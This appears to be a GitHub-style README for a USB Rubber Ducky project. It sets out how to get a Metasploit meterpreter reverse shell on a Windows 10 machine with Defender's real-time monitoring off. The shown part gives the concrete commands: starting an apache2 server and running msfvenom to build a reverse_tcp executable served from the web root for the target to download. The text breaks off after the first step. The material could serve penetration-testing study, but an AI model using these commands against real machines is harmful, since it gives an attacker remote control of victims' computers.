# Ducky_reverse_tcp_shell
Uses the metasploit framework and the USB-RubberDucky to create a reverse- shell (without Bypass)

AttackerMachine: Kali Linux (2022.1)connected to the targets Network

TargetMachine: Windows 10 Home, Windows Defender: realtime Monitoring off 


1. Create a payload to be executes on the target machine.

msfvenom:

payload: windows/meterpreter/reverse_tcp

filetype: .exe (for windows)

Directory: /var/www/html/yourfile.exe 

--> sets the directory of the malicious file to the html directory of my machine. To start this small server ill use apache2. 

Command: sudo service apache2 start

Command2: msfvenom -p windows/meterpreter/reverse_tcp LHOST your.ip.addr.ess LPORT 4444 -f exe -o /var/www/html/Yourfile.exe





